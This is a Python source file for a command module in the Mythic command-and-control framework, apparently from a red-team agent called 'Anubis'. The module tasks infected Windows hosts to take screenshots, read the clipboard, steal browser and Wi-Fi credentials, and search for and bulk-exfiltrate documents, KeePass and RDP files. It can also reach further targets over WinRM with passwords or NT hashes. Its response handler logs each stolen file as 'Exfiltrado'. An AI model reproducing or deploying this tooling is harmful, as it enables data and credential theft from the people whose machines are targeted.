from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import json, base64


class CollectionExtArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="action",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(required=False)],
                description=(
                    "screenshot|clipboard|browser|wifi|search|get|multiget|"
                    "system_info|recent_files. Padrao: screenshot."
                ),
                default_value="screenshot",
            ),
            CommandParameter(
                name="scope",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(required=False)],
                description="local (host do agente) | remote (WinRM no alvo).",
                default_value="local",
            ),
            CommandParameter(
                name="path",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(required=False)],
                description="(search/get/multiget) caminho base ou arquivo.",
                default_value="",
            ),
            CommandParameter(
                name="exts",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(required=False)],
                description="(search/multiget) extensoes separadas por virgula.",
                default_value=".doc,.docx,.xls,.xlsx,.pdf,.kdbx,.rdp,.txt",
            ),
            CommandParameter(
                name="keywords",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(required=False)],
                description="(search/multiget) palavras no nome (virgula).",
                default_value="",
            ),
            CommandParameter(
                name="browser",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(required=False)],
                description="(browser) chrome|edge|firefox.",
                default_value="chrome",
            ),
            CommandParameter(
                name="all_drives",
                type=ParameterType.Boolean,
                parameter_group_info=[ParameterGroupInfo(required=False)],
                description="(search) varrer todos os discos.",
                default_value=False,
            ),
            CommandParameter(
                name="max_files",
                type=ParameterType.Number,
                parameter_group_info=[ParameterGroupInfo(required=False)],
                description="Limite de arquivos. Padrao 200.",
                default_value=200,
            ),
            CommandParameter(
                name="max_mb",
                type=ParameterType.Number,
                parameter_group_info=[ParameterGroupInfo(required=False)],
                description="(multiget) limite total MB. Padrao 50.",
                default_value=50,
            ),
            CommandParameter(
                name="remote",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(required=False)],
                description="(scope=remote) IP/hostname do alvo WinRM.",
                default_value="",
            ),
            CommandParameter(
                name="port",
                type=ParameterType.Number,
                parameter_group_info=[ParameterGroupInfo(required=False)],
                description="(scope=remote) porta WinRM. Padrao 5985.",
                default_value=5985,
            ),
            CommandParameter(
                name="username",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(required=False)],
                description="(scope=remote) usuario.",
                default_value="",
            ),
            CommandParameter(
                name="password",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(required=False)],
                description="(scope=remote) senha — obrigatoria para Invoke-Command no agente.",
                default_value="",
            ),
            CommandParameter(
                name="nthash",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(required=False)],
                description="(scope=remote) NT hash — nao autentica PS nativo; devolve dica SOCKS/evil-winrm.",
                default_value="",
            ),
            CommandParameter(
                name="domain",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(required=False)],
                description="(scope=remote) dominio.",
                default_value="",
            ),
            CommandParameter(
                name="socks_port",
                type=ParameterType.Number,
                parameter_group_info=[ParameterGroupInfo(required=False)],
                description="Porta SOCKS Mythic para dicas ao operador. Padrao 7005.",
                default_value=7005,
            ),
        ]

    async def parse_arguments(self):
        defaults = {
            "action": "screenshot",
            "scope": "local",
            "path": "",
            "exts": ".doc,.docx,.xls,.xlsx,.pdf,.kdbx,.rdp,.txt",
            "keywords": "",
            "browser": "chrome",
            "all_drives": False,
            "max_files": 200,
            "max_mb": 50,
            "remote": "",
            "port": 5985,
            "username": "",
            "password": "",
            "nthash": "",
            "domain": "",
            "socks_port": 7005,
        }
        if self.command_line and self.command_line.strip().startswith("{"):
            d = json.loads(self.command_line)
            self.add_arg("action", d.get("action", defaults["action"]))
            self.add_arg("scope", d.get("scope", defaults["scope"]))
            self.add_arg("path", d.get("path", ""))
            self.add_arg("exts", d.get("exts", defaults["exts"]))
            self.add_arg("keywords", d.get("keywords", ""))
            self.add_arg("browser", d.get("browser", "chrome"))
            self.add_arg("all_drives", d.get("all_drives", False), ParameterType.Boolean)
            self.add_arg("max_files", d.get("max_files", 200), ParameterType.Number)
            self.add_arg("max_mb", d.get("max_mb", 50), ParameterType.Number)
            self.add_arg("remote", d.get("remote", ""))
            self.add_arg("port", d.get("port", 5985), ParameterType.Number)
            self.add_arg("username", d.get("username", ""))
            self.add_arg("password", d.get("password", ""))
            self.add_arg("nthash", d.get("nthash", ""))
            self.add_arg("domain", d.get("domain", ""))
            self.add_arg("socks_port", d.get("socks_port", 7005), ParameterType.Number)
        elif self.command_line:
            parts = self.command_line.strip().split()
            self.add_arg("action", parts[0] if len(parts) > 0 else "screenshot")
            self.add_arg("path", parts[1] if len(parts) > 1 else "")
            self.add_arg("scope", "local")
            self.add_arg("exts", defaults["exts"])
            self.add_arg("keywords", "")
            self.add_arg("browser", "chrome")
            self.add_arg("all_drives", False, ParameterType.Boolean)
            self.add_arg("max_files", 200, ParameterType.Number)
            self.add_arg("max_mb", 50, ParameterType.Number)
            self.add_arg("remote", "")
            self.add_arg("port", 5985, ParameterType.Number)
            self.add_arg("username", "")
            self.add_arg("password", "")
            self.add_arg("nthash", "")
            self.add_arg("domain", "")
            self.add_arg("socks_port", 7005, ParameterType.Number)
        else:
            for k, v in defaults.items():
                if isinstance(v, bool):
                    self.add_arg(k, v, ParameterType.Boolean)
                elif isinstance(v, int):
                    self.add_arg(k, v, ParameterType.Number)
                else:
                    self.add_arg(k, v)


class CollectionExtCommand(CommandBase):
    cmd = "collection_ext"
    needs_admin = False
    help_cmd = (
        "collection_ext [action] [path]\n"
        'collection_ext {"action":"...","scope":"local|remote",...}'
    )
    description = (
        "Collection TA0009 via agente Anubis.\n"
        "scope=local: coleta no host do callback.\n"
        "scope=remote: coleta no alvo via WinRM (password obrigatorio no agente; "
        "nthash so gera dica SOCKS/evil-winrm).\n\n"
        "Actions: screenshot, clipboard, browser, wifi, search, get, multiget, "
        "system_info, recent_files.\n"
        "Remote recomendado: wifi, search, get, multiget, system_info, recent_files.\n\n"
        "Exfil sempre pelo C2 (JSON + files b64 no Mythic)."
    )
    version = 3
    author = "@wtechsec"
    attackmapping = [
        "T1005",
        "T1113",
        "T1115",
        "T1555.003",
        "T1021.006",
        "T1090",
    ]
    supported_ui_features = []
    argument_class = CollectionExtArguments
    attributes = CommandAttributes(
        supported_python_versions=["Python 3.8"],
        supported_os=[SupportedOS.Windows],
    )

    async def create_go_tasking(
        self, taskData: PTTaskMessageAllData
    ) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        action = taskData.args.get_arg("action") or "screenshot"
        scope = taskData.args.get_arg("scope") or "local"
        path = taskData.args.get_arg("path") or ""
        remote = taskData.args.get_arg("remote") or ""
        extra = ""
        if scope in ("remote", "winrm"):
            extra = " ->{} ".format(remote or "?")
        if action == "browser":
            extra += " {}".format(taskData.args.get_arg("browser") or "chrome")
        elif action in ("search", "get", "multiget") and path:
            extra += " {}".format(path)
        response.DisplayParams = "{}{}{}".format(action, "" if scope == "local" else " [remote]", extra)
        return response

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        raw = ""
        if response is not None:
            raw = (
                response.decode()
                if isinstance(response, (bytes, bytearray))
                else str(response)
            )
        output, err, files = "", "", []
        try:
            d = json.loads(raw)
            output = d.get("output", "") or ""
            err = d.get("err", "") or ""
            files = d.get("files", []) or []
        except (json.JSONDecodeError, ValueError, TypeError):
            output = raw
        text = "\n".join(x for x in (output, err) if x)
        if text:
            await SendMythicRPCResponseCreate(
                MythicRPCResponseCreateMessage(
                    TaskID=task.Task.ID, Response=text.encode()
                )
            )
        for f in files:
            name = f.get("name", "unknown")
            try:
                contents = base64.b64decode(f.get("b64", "") or "")
                if not contents:
                    raise ValueError("b64 vazio")
                fr = await SendMythicRPCFileCreate(
                    MythicRPCFileCreateMessage(
                        TaskID=task.Task.ID,
                        Filename=name,
                        FileContents=contents,
                        DeleteAfterFetch=False,
                    )
                )
                msg = (
                    "[+] Exfiltrado: {} ({} bytes)\n".format(name, len(contents))
                    if fr.Success
                    else "[!] Falha {}: {}\n".format(name, getattr(fr, "Error", "?"))
                )
                await SendMythicRPCResponseCreate(
                    MythicRPCResponseCreateMessage(
                        TaskID=task.Task.ID, Response=msg.encode()
                    )
                )
            except Exception as e:
                await SendMythicRPCResponseCreate(
                    MythicRPCResponseCreateMessage(
                        TaskID=task.Task.ID,
                        Response="[!] Erro {}: {}\n".format(name, e).encode(),
                    )
                )
        return resp
